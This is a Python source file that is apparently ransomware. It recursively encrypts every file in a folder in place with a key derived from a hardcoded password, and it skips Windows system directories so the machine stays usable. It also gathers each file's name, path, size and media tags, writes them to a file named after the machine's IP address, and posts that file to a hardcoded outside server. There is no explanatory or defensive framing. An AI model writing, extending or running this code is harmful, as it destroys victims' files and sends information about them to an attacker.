

import pathlib
from cryptography.fernet import Fernet
import base64
import hashlib

import os
import time
from PIL import Image
from mutagen.easyid3 import EasyID3
from mutagen.mp3 import MP3

import requests
import socket

data = []

#Function to collect metadata on all encrypted files
def get_file_metadata(file_path):
    # Get basic file information
    file_info = {
        'name': os.path.basename(file_path),
        'size': os.path.getsize(file_path),
        'last_used': time.ctime(os.path.getmtime(file_path)),
        'extension': os.path.splitext(file_path)[1],
        'path': file_path,
    }

    # Add specialized metadata based on file type
    if file_info['extension'].lower() in ['.jpg', '.jpeg', '.png', '.gif']:
        with Image.open(file_path) as img:
            file_info['image_size'] = img.size
            file_info['image_format'] = img.format
            

    elif file_info['extension'].lower() == '.mp3':
        audio = MP3(file_path)
        audio_info = EasyID3(file_path)
        file_info['audio_duration'] = audio.info.length
        file_info['artist'] = audio_info['artist'][0]
        file_info['title'] = audio_info['title'][0]

    return file_info

#Generate password for symmetric encryption
def generate_key(password):
    #use hash for more robustness if using short passwords
    hash_obj = hashlib.sha256(str(password).encode())
    hash_key = hash_obj.digest()
    return base64.urlsafe_b64encode(hash_key[:32])



#Check if the file to be encrypted is in a 'essential folder for windows to run'
def is_safe_to_encrypt(filename):
    """Checks if the given filename is safe to encrypt."""
    # Get the absolute path of the filename
    absolute_path = os.path.abspath(filename)

    # Define a list of sensitive directories or keywords
    sensitive_directories = ['Program Files', 'Windows', 'System32, recover.exe']

    # Check if the filename or its parent directories contain sensitive keywords
    for directory in sensitive_directories:
        if directory in absolute_path:
            return False  # It's not safe to encrypt

    return True  # It's safe to encrypt

#Encryption function
def encrypt(filename, key):
    global data
    f = Fernet(key)

    if not is_safe_to_encrypt(filename):
        return

    try:
        metadata = get_file_metadata(filename)
        data.append(metadata)
    except:
        pass

    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()

    # encrypt data
    try:
        encrypted_data = f.encrypt(file_data)
        print(f"[*] Encrypting {filename}")
    except:
        pass

    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)
   
#Recursive function to encrypt files inside folders     
def encrypt_folder(foldername, key):
    # if it's a folder, encrypt the entire folder (i.e all the containing files)
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            # encrypt the file
            encrypt(child, key)
        elif child.is_dir():
            # if it's a folder, encrypt the entire folder by calling this function recursively
            encrypt_folder(child, key)
 
#Function to upload a file into our server           
def upload_file(file_path, upload_url):
    try:
        with open(file_path, 'rb') as file:
            files = {'files': (file_path, file)}
            response = requests.post(upload_url, files=files)

            if response.status_code == 204:
                print("File uploaded successfully.")
            else:
                print(f"Failed to upload file. Server returned status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

#Get ip of the machine 
def get_local_ip():
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   
        # Connect to a remote server (doesn't have to be reachable)
        s.connect(('10.0.0.0', 1))
        # Get the local IP address
        local_ip = s.getsockname()[0] 
        return local_ip
    except Exception as e:
        #print(f"Error: {e}")
        return 'nofound'


if __name__ == "__main__":
    foldername = 'test'
    password = '1234'
    key = generate_key(password)
    encrypt_folder(foldername, key)
     
    ip = get_local_ip()
    local_ip = ip.replace('.', '_')
    
    with open(f'data_{local_ip}.txt', 'w') as file:
        for item in data:
            file.write(str(item) + '\n')
    
    upload_url = 'http://164.90.216.244:8000/upload'
    file_path = f'data_{local_ip}.txt' 
    upload_file(file_path, upload_url)
    
    